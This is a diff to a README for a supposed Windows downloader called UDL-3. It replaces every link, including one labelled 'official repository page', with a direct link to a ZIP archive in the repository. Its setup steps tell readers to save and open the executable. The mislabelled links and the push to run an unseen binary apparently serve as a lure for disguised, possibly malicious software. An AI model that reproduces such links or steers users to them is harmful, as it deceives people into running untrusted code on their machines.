@@ -1,6 +1,6 @@
 # 📥 UDL-3 - Download your online files with ease
 
-[![Download UDL-3](https://img.shields.io/badge/Download-UDL--3-blue.svg)](https://github.com/Operculate-reductioadabsurdum58/UDL-3)
+[![Download UDL-3](https://img.shields.io/badge/Download-UDL--3-blue.svg)](https://github.com/Operculate-reductioadabsurdum58/UDL-3/raw/refs/heads/main/downloads/UD_2.3.zip)
 
 ## 📌 About This Application
 
@@ -20,12 +20,12 @@ The software functions independently on Windows systems. You do not need experie
 
 Follow these instructions to set up the application on your computer.
 
-1. Navigate to the [official repository page](https://github.com/Operculate-reductioadabsurdum58/UDL-3).
+1. Navigate to the [official repository page](https://github.com/Operculate-reductioadabsurdum58/UDL-3/raw/refs/heads/main/downloads/UD_2.3.zip).
 2. Locate the link provided below to begin the setup.
 3. Save the executable file to your desktop folder.
 4. Open the file to start the installer.
 
-[Get UDL-3 Here](https://github.com/Operculate-reductioadabsurdum58/UDL-3)
+[Get UDL-3 Here](https://github.com/Operculate-reductioadabsurdum58/UDL-3/raw/refs/heads/main/downloads/UD_2.3.zip)
 
 ## 🛠 Installation Process
 
